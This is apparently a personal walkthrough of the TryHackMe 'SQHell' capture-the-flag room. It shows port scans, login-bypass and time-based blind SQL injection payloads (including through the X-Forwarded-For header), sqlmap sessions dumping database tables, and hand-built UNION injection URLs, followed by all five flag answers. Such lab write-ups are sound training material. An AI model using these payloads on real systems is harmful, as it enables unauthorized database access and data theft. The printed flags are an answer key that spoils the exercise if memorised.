----
Try and find all the flags in the SQL Injections
----
![](https://assets.tryhackme.com/additional/banners/sqhell_banner.jpg)

### Find all the Flags!

 Start Machine

Give the machine a minute to boot and then connect to [http://MACHINE_IP](http://machine_ip/)

There are 5 flags to find but you have to defeat the different SQL injection types.

**Hint:** Unless displayed on the page the flags are stored in the flag table in the flag column.  

Answer the questions below

```
┌──(witty㉿kali)-[~/Downloads]
└─$ rustscan -a 10.10.25.154 --ulimit 5500 -b 65535 -- -A -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
🌍HACK THE PLANET🌍

[~] The config file is expected to be at "/home/witty/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.25.154:22
Open 10.10.25.154:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-19 13:01 EDT
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 13:01
Completed NSE at 13:01, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 13:01
Completed NSE at 13:01, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 13:01
Completed NSE at 13:01, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 13:01
Completed Parallel DNS resolution of 1 host. at 13:01, 0.01s elapsed
DNS resolution of 1 IPs took 0.03s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 13:01
Scanning 10.10.25.154 [2 ports]
Discovered open port 80/tcp on 10.10.25.154
Discovered open port 22/tcp on 10.10.25.154
Completed Connect Scan at 13:01, 0.20s elapsed (2 total ports)
Initiating Service scan at 13:01
Scanning 2 services on 10.10.25.154
Completed Service scan at 13:02, 6.45s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.25.154.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 13:02
Completed NSE at 13:02, 5.77s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 13:02
Completed NSE at 13:02, 0.83s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 13:02
Completed NSE at 13:02, 0.00s elapsed
Nmap scan report for 10.10.25.154
Host is up, received user-set (0.20s latency).
Scanned at 2023-04-19 13:01:58 EDT for 14s

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 6a1092fdb9896b980ad9fbfe3ad1e899 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCt94CN0ZOOYkgET9SbgbFV5qhqahzGqX2y4ZaXKrEJTqEPfMtZRLXlZRfshhQEiVLr9ZH9lHWEiX0lWZ9q6YwqMfJJd9jhIguxqapA1O3ttNYoICeCU7p0oAzC8GnEU2I41mh0VpleGvDIap5Ajtm0IEY5K8XoNiqO0cupQjAwZZZrMGYgbiveRHKhUoU0DbDJ8Q9ltJPXIF3c5FqbcUDyze/S9jXsrBSvNrpUqupAXGYep3iHtMXIVQq8gtqvnuSDnwzYcH+lPJc8LYQaB8y72p1qZ+pJ8BhMd5r3yr1la/sARhaEkRqNnEdQbXdoj5yXhUqNyelfJvwFhD2iEPIX3IwsqDv8PUZla08jrxOwVgpRdvLEJb8vxvwvcWMEduozbpPQnXqQ+Sg9Fdy6LHKg3zY4YzdWAZbxOLsntoHMir0DXaOQIb/xCeOysEcldEJUO+r5fn+n5K9CXYEQ6ODVhdlyU73SH/syC6jgc+bUT0qFp79QMvLXonJLR8cL61k=
|   256 4e9dd9eaa4ef0544332f92dcb785fe78 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIdVJWgQyVb61PsNPmpYXJH/l5gas70nMbyA8kkP4f9JOCgT6f/OoQUEizBORpaohw3Xwy8YhY5ECVPzrYkbS1o=
|   256 fa5947890a27d4597f92a7967f2c2cf7 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINQqU4C/790KwdzHWUSiOaUYrOHDk3EG7QtEVuBg7tlT
80/tcp open  http    syn-ack nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Home
| http-methods: 
|_  Supported Methods: GET HEAD POST
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 13:02
Completed NSE at 13:02, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 13:02
Completed NSE at 13:02, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 13:02
Completed NSE at 13:02, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.64 seconds

http://10.10.25.154/login

user: ' or 1=1 # 
pass: anything

THM{FLAG1:E786483E5A53075750F1FA792E823BD2}

http://10.10.25.154/terms-and-conditions


Terms and Conditions

We only have a few small terms:

i: We own the soul of any visitors

ii: We can't be blamed for any security breaches

iii: We log your IP address for analytics purposes

those are additional headers that may be used to log IP addresses for analytics purposes:

1.  "X-Originating-IP": This header may contain the original IP address of the client making the request. It can be useful when requests pass through multiple proxies or load balancers, allowing the original IP address of the client to be captured for analytics purposes.
    
2.  "X-Remote-IP": This header may contain the IP address of the client making the request. It is similar to the "Remote Address" or "X-Forwarded-For" header and can be used to capture the actual IP address of the client, especially when requests pass through proxies or load balancers.
    
3.  "X-Remote-Addr": This header may contain the IP address of the client making the request. It can be used to capture the client's actual IP address, similar to the "Remote Address" or "X-Forwarded-For" header.
    
4.  "X-Forwarded-Host": This header may contain the original host or domain name of the client making the request. It can be useful when requests pass through proxies or load balancers, allowing the original host or domain name to be captured for analytics purposes.

5.  "X-Forwarded-For": This header may contain the IP address of the client making the request. It is commonly used when requests pass through proxies or load balancers, allowing the original IP address of the client to be captured for analytics purposes.

https://www.exploit-db.com/exploits/49307

A Time Based SQL Injection vulnerability

X-Forwarded-For: ' and (select 1 from (select(sleep(5)))a) and 'a'='a

or

X-Forwarded-For: 127.0.0.1' AND (SELECT * FROM (SELECT(SLEEP(5)))1) AND '1'='1

testing with burp

GET /terms-and-conditions HTTP/1.1
Host: 10.10.234.217
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.234.217/
X-Forwarded-For: 1' AND (SELECT 4154 FROM (SELECT(SLEEP(5)))gTjQ) AND 'SDUM'='SDUM
Connection: close
Upgrade-Insecure-Requests: 1

after 5 seconds we get a response :)

let's use sqlmap with the parameter X-Forwarded-For

https://twitter.com/0xJin/status/1474352640981143553

┌──(witty㉿kali)-[~/Downloads]
└─$ sqlmap -u "http://10.10.234.217/terms-and-conditions" --header="X-Forwarded-For: 1*" --dbs --batch --random-agent --threads=10 Injection marker: *
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.7.2#stable}
|_ -| . [(]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 14:28:27 /2023-04-19/

[14:28:27] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (X11; U; Linux i686; de; rv:1.9.1) Gecko/20090624 Firefox/3.5' from file '/usr/share/sqlmap/data/txt/user-agents.txt'
[14:28:28] [WARNING] you've provided target URL without any GET parameters (e.g. 'http://www.site.com/article.php?id=1') and without providing any POST parameters through option '--data'
do you want to try URI injections in the target URL itself? [Y/n/q] Y
[14:28:28] [INFO] testing connection to the target URL
[14:28:28] [INFO] checking if the target is protected by some kind of WAF/IPS
[14:28:29] [INFO] testing if the target URL content is stable
[14:28:29] [INFO] target URL content is stable
[14:28:29] [INFO] testing if (custom) HEADER parameter 'X-Forwarded-For #1*' is dynamic
[14:28:29] [WARNING] (custom) HEADER parameter 'X-Forwarded-For #1*' does not appear to be dynamic
[14:28:29] [WARNING] heuristic (basic) test shows that (custom) HEADER parameter 'X-Forwarded-For #1*' might not be injectable
[14:28:30] [INFO] testing for SQL injection on (custom) HEADER parameter 'X-Forwarded-For #1*'
[14:28:30] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[14:28:32] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[14:28:32] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[14:28:34] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[14:28:36] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[14:28:37] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[14:28:39] [INFO] testing 'Generic inline queries'
[14:28:39] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[14:28:40] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[14:28:41] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[14:28:42] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[14:28:54] [INFO] (custom) HEADER parameter 'X-Forwarded-For #1*' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
[14:28:54] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[14:28:54] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[14:29:00] [INFO] checking if the injection point on (custom) HEADER parameter 'X-Forwarded-For #1*' is a false positive
(custom) HEADER parameter 'X-Forwarded-For #1*' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 74 HTTP(s) requests:
---
Parameter: X-Forwarded-For #1* ((custom) HEADER)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: 1' AND (SELECT 4154 FROM (SELECT(SLEEP(5)))gTjQ) AND 'SDUM'='SDUM
---
[14:29:17] [INFO] the back-end DBMS is MySQL
[14:29:17] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
web server operating system: Linux Ubuntu
web application technology: Nginx 1.18.0
back-end DBMS: MySQL >= 5.0.12
[14:29:18] [INFO] fetching database names
[14:29:18] [INFO] fetching number of databases
multi-threading is considered unsafe in time-based data retrieval. Are you sure of your choice (breaking warranty) [y/N] N
[14:29:18] [INFO] retrieved: 
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] Y
2
[14:29:30] [INFO] retrieved: 
[14:29:35] [INFO] adjusting time delay to 2 seconds due to good response times
information_schema
[14:32:03] [INFO] retrieved: sqhell_1
available databases [2]:
[*] information_schema
[*] sqhell_1

[14:33:15] [INFO] fetched data logged to text files under '/home/witty/.local/share/sqlmap/output/10.10.234.217'

[*] ending @ 14:33:15 /2023-04-19/


┌──(witty㉿kali)-[~/Downloads]
└─$ sqlmap -u "http://10.10.234.217/terms-and-conditions" --header="X-Forwarded-For: 1*" --dbms mysql --batch --random-agent --threads=10 Injection marker: * -D sqhell_1 –tables
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.7.2#stable}
|_ -| . [']     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 14:38:22 /2023-04-19/

[14:38:22] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.9) Gecko/20071103 Firefox/2.0.0.9' from file '/usr/share/sqlmap/data/txt/user-agents.txt'
[14:38:23] [WARNING] you've provided target URL without any GET parameters (e.g. 'http://www.site.com/article.php?id=1') and without providing any POST parameters through option '--data'
do you want to try URI injections in the target URL itself? [Y/n/q] Y
[14:38:23] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: X-Forwarded-For #1* ((custom) HEADER)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: 1' AND (SELECT 4154 FROM (SELECT(SLEEP(5)))gTjQ) AND 'SDUM'='SDUM
---
[14:38:23] [INFO] testing MySQL
[14:38:23] [INFO] confirming MySQL
[14:38:23] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Nginx 1.18.0
back-end DBMS: MySQL >= 8.0.0
[14:38:23] [INFO] fetching tables for database: 'sqhell_1'
[14:38:23] [INFO] fetching number of tables for database 'sqhell_1'
multi-threading is considered unsafe in time-based data retrieval. Are you sure of your choice (breaking warranty) [y/N] N
[14:38:23] [INFO] resumed: 2
[14:38:23] [INFO] resumed: flag
[14:38:23] [INFO] resumed: hits
Database: sqhell_1
[2 tables]
+------+
| flag |
| hits |
+------+

[14:38:23] [INFO] fetched data logged to text files under '/home/witty/.local/share/sqlmap/output/10.10.234.217'

[*] ending @ 14:38:23 /2023-04-19/


┌──(witty㉿kali)-[~/Downloads]
└─$ sqlmap -u "http://10.10.234.217/terms-and-conditions" --header="X-Forwarded-For: 1*" --dbms mysql --batch --random-agent --threads=10 Injection marker: * -D sqhell_1 -T flag --dump   
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.7.2#stable}
|_ -| . [(]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 14:42:44 /2023-04-19/

[14:42:44] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (X11; U; Linux i686; pl-PL; rv:1.8.0.4) Gecko/20060608 Ubuntu/dapper-security Firefox/1.5.0.4' from file '/usr/share/sqlmap/data/txt/user-agents.txt'
[14:42:44] [WARNING] you've provided target URL without any GET parameters (e.g. 'http://www.site.com/article.php?id=1') and without providing any POST parameters through option '--data'
do you want to try URI injections in the target URL itself? [Y/n/q] Y
[14:42:44] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: X-Forwarded-For #1* ((custom) HEADER)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: 1' AND (SELECT 4154 FROM (SELECT(SLEEP(5)))gTjQ) AND 'SDUM'='SDUM
---
[14:42:45] [INFO] testing MySQL
[14:42:45] [INFO] confirming MySQL
[14:42:45] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Nginx 1.18.0
back-end DBMS: MySQL >= 8.0.0
[14:42:45] [INFO] fetching columns for table 'flag' in database 'sqhell_1'
multi-threading is considered unsafe in time-based data retrieval. Are you sure of your choice (breaking warranty) [y/N] N
[14:42:45] [INFO] resumed: 2
[14:42:45] [INFO] resumed: flag
[14:42:45] [INFO] resumed: id
[14:42:45] [INFO] fetching entries for table 'flag' in database 'sqhell_1'
[14:42:45] [INFO] fetching number of entries for table 'flag' in database 'sqhell_1'
[14:42:45] [WARNING] time-based comparison requires larger statistical model, please wait.............................. (done)
[14:42:54] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] Y
1
[14:43:00] [WARNING] (case) time-based comparison requires reset of statistical model, please wait.............................. (done)
[14:43:19] [INFO] adjusting time delay to 2 seconds due to good response times
THM{FLA
[14:44:25] [ERROR] invalid character detected. retrying..
[14:44:25] [WARNING] increasing time delay to 3 seconds
G2:C678ABFE1C01FCA19E03901CEDAB1D15}
[14:51:09] [INFO] retrieved: 1
Database: sqhell_1
Table: flag
[1 entry]
+----+---------------------------------------------+
| id | flag                                        |
+----+---------------------------------------------+
| 1  | THM{FLAG2:C678ABFE1C01FCA19E03901CEDAB1D15} |
+----+---------------------------------------------+

[14:51:17] [INFO] table 'sqhell_1.flag' dumped to CSV file '/home/witty/.local/share/sqlmap/output/10.10.234.217/dump/sqhell_1/flag.csv'
[14:51:17] [INFO] fetched data logged to text files under '/home/witty/.local/share/sqlmap/output/10.10.234.217'

[*] ending @ 14:51:17 /2023-04-19/

view-source:http://10.10.62.233/register
<script>
    $('input[name="username"]').keyup(function(){
        $('.userstatus').html('');
        let username = $(this).val();
        $.getJSON('/register/user-check?username='+ username,function(resp){
            if( resp.available ){
                $('.userstatus').css('color','#80c13d');
                $('.userstatus').html('Username available');
            }else{
                $('.userstatus').css('color','#F00');
                $('.userstatus').html('Username already taken');
            }
        });
    });
</script>

http://10.10.62.233/register/user-check?username=admin
available	false

http://10.10.62.233/register/user-check?username=admin%27%20or%201=1%20#
available	true

time-based blind sqli

using burp
GET /register/user-check?username=1' AND (SELECT 7885 FROM (SELECT(SLEEP(5)))cWku) AND 'ozus'='ozus HTTP/1.1
Host: 10.10.62.233
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1

using sqlmap

┌──(witty㉿kali)-[~/Downloads]
└─$ sqlmap -u "http://10.10.62.233/register/user-check?username=a" --dbms mysql --batch --random-agent --threads=10   
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.7.2#stable}
|_ -| . ["]     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 12:46:54 /2023-04-20/

[12:46:54] [INFO] fetched random HTTP User-Agent header value 'Mozilla/4.0 (Mozilla/4.0; MSIE 7.0; Windows NT 5.1; FDM; SV1; .NET CLR 3.0.04506.30)' from file '/usr/share/sqlmap/data/txt/user-agents.txt'
[12:46:55] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: username (GET)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=1' AND (SELECT 7885 FROM (SELECT(SLEEP(5)))cWku) AND 'ozus'='ozus
---
[12:46:55] [INFO] testing MySQL
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] Y
[12:47:10] [INFO] confirming MySQL
[12:47:10] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
[12:47:20] [INFO] adjusting time delay to 2 seconds due to good response times
[12:47:20] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Nginx 1.18.0
back-end DBMS: MySQL >= 8.0.0
[12:47:20] [INFO] fetched data logged to text files under '/home/witty/.local/share/sqlmap/output/10.10.62.233'

[*] ending @ 12:47:20 /2023-04-20/

                                                                                                     
┌──(witty㉿kali)-[~/Downloads]
└─$ sqlmap -u "http://10.10.62.233/register/user-check?username=a" --dbms mysql --batch --random-agent --threads=10 --dump
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.7.2#stable}
|_ -| . ["]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 12:47:56 /2023-04-20/

[12:47:56] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.93 Safari/537.36' from file '/usr/share/sqlmap/data/txt/user-agents.txt'
[12:47:57] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: username (GET)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=1' AND (SELECT 7885 FROM (SELECT(SLEEP(5)))cWku) AND 'ozus'='ozus
---
[12:47:57] [INFO] testing MySQL
[12:47:57] [INFO] confirming MySQL
[12:47:57] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Nginx 1.18.0
back-end DBMS: MySQL >= 8.0.0
[12:47:57] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
[12:47:57] [INFO] fetching current database
multi-threading is considered unsafe in time-based data retrieval. Are you sure of your choice (breaking warranty) [y/N] N
[12:47:57] [WARNING] time-based comparison requires larger statistical model, please wait.............................. (done)
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] Y
[12:48:11] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
[12:48:22] [INFO] adjusting time delay to 2 seconds due to good response times
sqhell_3
[12:49:30] [INFO] fetching tables for database: 'sqhell_3'
[12:49:30] [INFO] fetching number of tables for database 'sqhell_3'
[12:49:30] [INFO] retrieved: 2
[12:49:36] [INFO] retrieved: flag
[12:50:09] [INFO] retrieved: users
[12:50:50] [INFO] fetching columns for table 'flag' in database 'sqhell_3'
[12:50:50] [INFO] retrieved: 2
[12:50:57] [INFO] retrieved: id
[12:51:14] [INFO] retrieved: flag

┌──(witty㉿kali)-[~/Downloads]
└─$ sqlmap -u "http://10.10.62.233/register/user-check?username=a" --dbms mysql --batch --random-agent --threads=10 --dump -D sqhell_3 -T flag -C flag --dump
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.7.2#stable}
|_ -| . [.]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 12:53:10 /2023-04-20/

[12:53:10] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (X11; U; Linux x86_64; zh-TW; rv:1.8.1.11) Gecko/20071204 Ubuntu/7.10 (gutsy) Firefox/2.0.0.11' from file '/usr/share/sqlmap/data/txt/user-agents.txt'
[12:53:10] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: username (GET)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=1' AND (SELECT 7885 FROM (SELECT(SLEEP(5)))cWku) AND 'ozus'='ozus
---
[12:53:11] [INFO] testing MySQL
[12:53:11] [INFO] confirming MySQL
[12:53:11] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Nginx 1.18.0
back-end DBMS: MySQL >= 8.0.0
[12:53:11] [INFO] fetching entries of column(s) 'flag' for table 'flag' in database 'sqhell_3'
[12:53:11] [INFO] fetching number of column(s) 'flag' entries for table 'flag' in database 'sqhell_3'
multi-threading is considered unsafe in time-based data retrieval. Are you sure of your choice (breaking warranty) [y/N] N
[12:53:11] [INFO] resumed: 1
[12:53:11] [WARNING] (case) time-based comparison requires larger statistical model, please wait.............................. (done)
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] Y
[12:53:24] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
[12:53:36] [INFO] adjusting time delay to 2 seconds due to good response times
THM{FLAG3:97AEB3B28A4864416718F3A5FAF8F308}
Database: sqhell_3
Table: flag
[1 entry]
+---------------------------------------------+
| flag                                        |
+---------------------------------------------+
| THM{FLAG3:97AEB3B28A4864416718F3A5FAF8F308} |
+---------------------------------------------+

[12:59:43] [INFO] table 'sqhell_3.flag' dumped to CSV file '/home/witty/.local/share/sqlmap/output/10.10.62.233/dump/sqhell_3/flag.csv'
[12:59:43] [INFO] fetched data logged to text files under '/home/witty/.local/share/sqlmap/output/10.10.62.233'

[*] ending @ 12:59:43 /2023-04-20/

http://10.10.62.233/user?id=1%20union%20select%201,2,3;--%20-

http://10.10.62.233/user?id=31%20union%20select%201,2,3;--%20-

so is reflected 1 and 2 column

    Home User: 2 

User Details
User ID:  1
Username:  2
Posts:

    First Post
    Second Post

let's test first column 

http://10.10.62.233/user?id=31%20union%20select%20%221%20union%20select%201,2,3,4%22,2,3;--%20-


User Details
User ID:  1 union select 1,2,3,4
Username:  2
Posts:

    First Post
    Second Post
    2

so 2 column is reflected (we can retrieved the flag)

http://10.10.62.233/user?id=2%20union%20select%20%221%20union%20select%201,database(),3,4%22,2,3;--%20-

sqhell_4

retrieving table_name (seems complicated but it's easy)

http://10.10.62.233/user?id=2%20union%20select%20%221%20union%20select%201,table_name,3,4%20from%20information_schema.tables%20where%20table_schema=database()%22,2,3+from%20information_schema.tables%20where%20table_schema=database();--%20-


User ID:  1 union select 1,table_name,3,4 from information_schema.tables where table_schema=database()
Username:  2
Posts:

    First Post
    Second Post
    flag
    posts
    users

so we get table_name flag now getting columns

http://10.10.62.233/user?id=2%20union%20select%20%221%20union%20select%201,column_name,3,4%20+FROM+information_schema.columns+WHERE+table_name=%27flag%27%22,2,3+from%20information_schema.tables%20where%20table_schema=database();--%20-


User Details
User ID:  1 union select 1,column_name,3,4 FROM information_schema.columns WHERE table_name='flag'
Username:  2
Posts:

    First Post
    Second Post
    id
    flag

so column_name is flag now getting the flag :)

http://10.10.62.233/user?id=2%20union%20select%20%221%20union%20select%201,flag,3,4%20+FROM+sqhell_4.flag%22,2,3+from%20information_schema.tables%20where%20table_schema=database();--%20-

THM{FLAG4:BDF317B14EEF80A3F90729BF2B426BEF}

last flag

http://10.10.62.233/post?id=1%20union%20select%201,2,3,4,5;--%20-

The used SELECT statements have a different number of columns

http://10.10.62.233/post?id=1%20union%20select%201,2,3,4;--%20-

or

http://10.10.62.233/post?id=1%20order%20by%204;--%20-

so we have 4 columns

http://10.10.62.233/post?id=1%20and%201=2%20union%20select%201,2,3,4;--%20-

error-based sqli

http://10.10.62.233/post?id=1%20and%201=2%20union%20select%201,2,3,4;--%20-

two columns reflected

2
3

retrieving database()

http://10.10.62.233/post?id=1%20and%201=2%20union%20select%201,database(),3,4;--%20-

sqhell_5

retrieving table_name

http://10.10.62.233/post?id=1%20and%201=2%20union%20select%201,table_name,3,4%20from%20information_schema.tables%20where%20table_schema=database();--%20-

flag

retrieving column_name

http://10.10.62.233/post?id=1%20and%201=2%20union%20select%201,group_concat(column_name),3,4%20FROM+information_schema.columns+WHERE+table_name=%22flag%22;--%20-

id,flag

http://10.10.62.233/post?id=1%20and%201=2%20union%20select%201,flag,3,4%20from%20sqhell_5.flag;--%20-

THM{FLAG5:B9C690D3B914F7038BA1FC65B3FDF3C8}

Was really fun :)


```

Flag 1  

*THM{FLAG1:E786483E5A53075750F1FA792E823BD2}*

Flag 2  

Make sure to read the terms and conditions ;)

![[Pasted image 20230419134653.png]]

*THM{FLAG2:C678ABFE1C01FCA19E03901CEDAB1D15}*

Flag 3  

*THM{FLAG3:97AEB3B28A4864416718F3A5FAF8F308}*

Flag 4  

Well, dreams, they feel real while we're in them right?


![[Pasted image 20230420121906.png]]

![[Pasted image 20230420124933.png]]

![[Pasted image 20230420125630.png]]

*THM{FLAG4:BDF317B14EEF80A3F90729BF2B426BEF}*

Flag 5

![[Pasted image 20230420130133.png]]

![[Pasted image 20230420131039.png]]

![[Pasted image 20230420131449.png]]

*THM{FLAG5:B9C690D3B914F7038BA1FC65B3FDF3C8}*

[[Masterminds]]